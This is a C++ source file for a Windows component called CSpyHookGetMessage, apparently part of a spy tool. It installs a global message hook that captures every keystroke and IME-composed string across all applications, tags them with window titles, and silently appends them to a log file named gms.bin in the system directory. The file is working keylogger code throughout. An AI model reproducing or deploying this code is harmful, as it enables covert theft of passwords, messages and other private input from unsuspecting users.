#include "stdafx.h"
#include "SpyHookGetMessage.h"
#include "../Utility/StringHelper/StringHelper.h"
#pragma comment(lib, "Imm32.lib")

extern HWND g_hLastInputHwnd;
extern HWND g_hLastOutputHwnd;
static const TCHAR* HOOK_RECORD_FILE_NAME = _T("gms.bin");
static const TCHAR* SEMAPHORE_NAME = _T("Global\\GetMsgSemaphore");

CSpyHookGetMessage::CSpyHookGetMessage()
{
    m_hWriteFileSemaphore = OpenSemaphore(SEMAPHORE_ALL_ACCESS, FALSE, SEMAPHORE_NAME);
    if (m_hWriteFileSemaphore == NULL)
    {
        SECURITY_DESCRIPTOR securityDesc;
        ::InitializeSecurityDescriptor(&securityDesc, SECURITY_DESCRIPTOR_REVISION);
        ::SetSecurityDescriptorDacl(&securityDesc, TRUE, NULL, FALSE);
        SECURITY_ATTRIBUTES securityAttr;
        securityAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
        securityAttr.bInheritHandle = FALSE;
        securityAttr.lpSecurityDescriptor = &securityDesc;
        m_hWriteFileSemaphore = CreateSemaphore( &securityAttr, 1, 1, SEMAPHORE_NAME);
    }


    // Maintain the log file, if it is too huge, we will cut it off.
    uint32_t MAX_SIZE_OF_LOG_FILE = 100 * 1024 * 1024; // 100M
    TCHAR szFileSavePath[MAX_PATH];
    GetSystemDirectory(szFileSavePath, MAX_PATH);
    _tcscat(szFileSavePath, _T("/"));
    _tcscat(szFileSavePath, HOOK_RECORD_FILE_NAME);
    WIN32_FILE_ATTRIBUTE_DATA fileData;
    if (GetFileAttributesEx(szFileSavePath, GetFileExInfoStandard, &fileData) != FALSE)
    {
        if (fileData.nFileSizeHigh > 0 || fileData.nFileSizeLow > MAX_SIZE_OF_LOG_FILE)
        {
            HANDLE hFileHandle = CreateFile(szFileSavePath, FILE_ALL_ACCESS, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFileHandle != INVALID_HANDLE_VALUE)
            {
                SetFilePointer(hFileHandle, MAX_SIZE_OF_LOG_FILE / 2, 0, FILE_BEGIN);
                SetEndOfFile(hFileHandle);
                CloseHandle(hFileHandle);
            }
        }
    }
}

CSpyHookGetMessage::~CSpyHookGetMessage()
{
    CloseHandle(m_hWriteFileSemaphore);
}

bool CSpyHookGetMessage::StartImpl()
{
    m_hHookHandle = SetWindowsHookEx(WH_GETMESSAGE, &GetMessageProc, m_hModuleHandle, 0);
    return m_hHookHandle != NULL;
}

LRESULT CALLBACK CSpyHookGetMessage::GetMessageProc( int nCode, WPARAM wParam, LPARAM lParam )
{
    static CSerializer MsgRecordSerializer;
    MSG* pMsg = (MSG*)lParam;
    static uint32_t uLastWriteDataTime = pMsg->time;
    if (pMsg != NULL && wParam == PM_REMOVE)
    {
        // Handle Text Input Message
        RecordTextMessage(pMsg, MsgRecordSerializer);
        if (pMsg->time - uLastWriteDataTime > 180000 || pMsg->message == eCMT_Flush)//cache for 3 minutes
        {
            uLastWriteDataTime = pMsg->time;
            if (MsgRecordSerializer.GetWritePos() > 0)
            {
                HANDLE hSemaphore = OpenSemaphore(SEMAPHORE_ALL_ACCESS, FALSE, SEMAPHORE_NAME);

                if (hSemaphore != NULL)
                {
                    DWORD dwWaitResult = WaitForSingleObject( hSemaphore, 0L);
                    switch (dwWaitResult) 
                    { 
                    case WAIT_OBJECT_0:
                        {
                            HWND parentHwnd = pMsg->hwnd;
                            while (GetParent(parentHwnd) != NULL)
                                parentHwnd = GetParent(parentHwnd);

                            bool bWrited = false;
                            TCHAR szFileSavePath[MAX_PATH];
                            GetSystemDirectory(szFileSavePath, MAX_PATH);
                            _tcscat(szFileSavePath, _T("/"));
                            _tcscat(szFileSavePath, HOOK_RECORD_FILE_NAME);
                            
                            if (parentHwnd != g_hLastOutputHwnd)
                            {
                                static TCHAR szsInfoFormat[MAX_PATH] = {0};
                                _tcscat(szsInfoFormat, _T("\n"));
                                _tcscat(szsInfoFormat, _T("[w "));
                                GetWindowText(parentHwnd, szsInfoFormat + 3, MAX_PATH);
                                _tcscat(szsInfoFormat, _T("\\w] "));
                                char szBuffer[MAX_PATH];
                                CStringHelper::GetInstance()->ConvertToCHAR(szsInfoFormat, szBuffer, MAX_PATH);
                                FILE* pFile = _tfopen(szFileSavePath, _T("at+"));
                                if (pFile)
                                {
                                    fwrite(szBuffer, sizeof(char), strlen(szBuffer), pFile);
                                    fwrite(MsgRecordSerializer.GetReadPtr(), sizeof(BYTE), MsgRecordSerializer.GetWritePos() - MsgRecordSerializer.GetReadPos(), pFile);
                                    fclose(pFile);
                                    bWrited = true;
                                }
                            }
                            if (!bWrited)
                            {
                                MsgRecordSerializer.Deserialize(szFileSavePath, _T("at+"));
                            }
                            g_hLastOutputHwnd = parentHwnd;
                            MsgRecordSerializer.Reset();
                            ReleaseSemaphore(hSemaphore, 1, NULL);
                        }
                        break; 

                    case WAIT_TIMEOUT:
                        if (MsgRecordSerializer.GetWritePos() > 1024 * 1024)// This is just to avoid cache keep going up for some unknown reason.
                        {
                            MsgRecordSerializer.Reset();
                        }
                        break; 
                    }
                    CloseHandle(hSemaphore);
                }
            }
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

bool CSpyHookGetMessage::RecordTextMessage( const MSG* pMsg, CSerializer& serializer )
{
    bool bRet = false;
    bool bRecordCharMsg = pMsg->message == WM_CHAR;
    bool bRecordCompositionMsg = pMsg->message == WM_IME_COMPOSITION && (GCS_RESULTSTR & pMsg->lParam) != 0;
    bool bFlush = pMsg->message == eCMT_Flush;
    if (bRecordCharMsg || bRecordCompositionMsg || bFlush)
    {
        static uint32_t uLastTextInputMsgTime = 0;
        static TCHAR cLastChar = 0;
        static uint32_t uSameCharCount = 0;
        HWND parentHwnd = pMsg->hwnd;
        while (GetParent(parentHwnd) != NULL)
            parentHwnd = GetParent(parentHwnd);
        
        if (pMsg->time != uLastTextInputMsgTime)
        {
            static TCHAR szsInfoFormat[MAX_PATH * 5] = {0};
            if (pMsg->time - uLastTextInputMsgTime > 180 * 1000 && !bFlush)// Re-record time if the delay lasts for more than 30 seconds.
            {
                TCHAR szTime[32];
                _stprintf(szTime, _T("%d "), pMsg->time);
                _tcscat(szsInfoFormat, szTime);
                FlushSameCharInfo(cLastChar, uSameCharCount, szsInfoFormat);
            }
            if (bRecordCharMsg)
            {
                bRet = true;
				if (cLastChar == (TCHAR)pMsg->wParam && cLastChar != 0)
                {
                    ++uSameCharCount;
                }
                else
                {
                    FlushSameCharInfo(cLastChar, uSameCharCount, szsInfoFormat);
                    TCHAR szChar[8];
                    if (pMsg->wParam >= 32)// In ASCII, codes less than 32 are "control" not character.
                    {
                        _stprintf(szChar, _T("%c"), pMsg->wParam);
                    }
                    else
                    {
                        _stprintf(szChar, _T("(^%c)"), pMsg->wParam + 64); // A control code plus 64 is the character code.
                    }
                    _tcscat(szsInfoFormat, szChar);
                    char szBuffer[MAX_PATH];
                    CStringHelper::GetInstance()->ConvertToCHAR(szsInfoFormat, szBuffer, MAX_PATH);
                    serializer.Serialize(szBuffer, sizeof(char) * strlen(szBuffer)); // Do not use serializer << szBuffer to avoid NULL charater.
                    szsInfoFormat[0] = 0;
                }

                uLastTextInputMsgTime = pMsg->time;
                g_hLastInputHwnd = pMsg->hwnd;
                cLastChar = (TCHAR)pMsg->wParam;
            }
            else if (bRecordCompositionMsg)
            {
                FlushSameCharInfo(cLastChar, uSameCharCount, szsInfoFormat);
                HIMC hIMC = ImmGetContext(pMsg->hwnd);
                TCHAR szInputString[MAX_PATH];
                LONG iStrLength = ImmGetCompositionString(hIMC, GCS_RESULTSTR, szInputString, MAX_PATH);
                szInputString[iStrLength/sizeof(TCHAR)] = 0;
                ImmReleaseContext(pMsg->hwnd, hIMC);
                _tcscat(szsInfoFormat, szInputString);
                char szBuffer[MAX_PATH];
                CStringHelper::GetInstance()->ConvertToCHAR(szsInfoFormat, szBuffer, MAX_PATH);
                serializer.Serialize(szBuffer, sizeof(char) * strlen(szBuffer)); // Do not use serializer << szBuffer to avoid NULL charater.
                szsInfoFormat[0] = 0;
                uLastTextInputMsgTime = pMsg->time;
                g_hLastInputHwnd = pMsg->hwnd;
                bRet = true;
            }
            else if (bFlush)
            {
                FlushSameCharInfo(cLastChar, uSameCharCount, szsInfoFormat);
                char szBuffer[MAX_PATH];
                CStringHelper::GetInstance()->ConvertToCHAR(szsInfoFormat, szBuffer, MAX_PATH);
                serializer.Serialize(szBuffer, sizeof(char) * strlen(szBuffer)); // Do not use serializer << szBuffer to avoid NULL charater.
                szsInfoFormat[0] = 0;
            }
        }
    }

    return bRet;
}

bool CSpyHookGetMessage::FlushSameCharInfo(TCHAR& cLastChar, uint32_t& uSameCharCount, TCHAR* pFlushString)
{
    bool bRet = false;
    if (cLastChar != 0)
    {
        cLastChar = 0;
        if (uSameCharCount > 0)
        {
            TCHAR szSameCount[8];
            _stprintf(szSameCount, _T("(x%d)"), uSameCharCount + 1);
            _tcscat(pFlushString, szSameCount);
            uSameCharCount = 0;
            bRet = true;
        }
    }
    return bRet;
}